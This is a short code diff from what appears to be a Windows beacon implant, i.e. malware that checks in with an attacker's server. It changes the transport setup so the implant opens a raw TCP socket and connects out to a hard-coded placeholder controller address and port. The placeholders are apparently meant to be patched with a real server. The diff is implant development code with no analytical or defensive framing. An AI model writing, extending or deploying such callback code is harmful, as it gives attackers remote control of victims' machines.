@@ -20,10 +20,26 @@
 -*/
 DEFINESEC(B) BOOL TransportInit( PBEACON_INSTANCE Ins )
 {
-	WSADATA wsd;
+	WSADATA            wsd;
+	struct sockaddr_in sin;
 
-	return ! Ins->api.WSAStartup( MAKEWORD( 2, 2 ), &wsd ) 
-		? TRUE : FALSE;
+	if ( !Ins->api.WSAStartup( MAKEWORD( 2, 2 ), &wsd ) )
+	{
+		if ( (Ins->Socket = Ins->api.WSASocketA( AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0 )) != INVALID_SOCKET )
+		{
+			sin.sin_addr.s_addr = 0x44444444;
+			sin.sin_family      = AF_INET;
+			sin.sin_port        = 0x4343;
+
+			if ( !Ins->api.WSAConnect( Ins->Socket, CPTR( &sin ), sizeof( sin ), NULL, NULL, NULL, NULL ) )
+			{
+				return TRUE;
+			};
+			Ins->api.closesocket( Ins->Socket );
+		};
+		Ins->api.WSACleanup();
+	};
+	return FALSE;
 };
 
 /*-
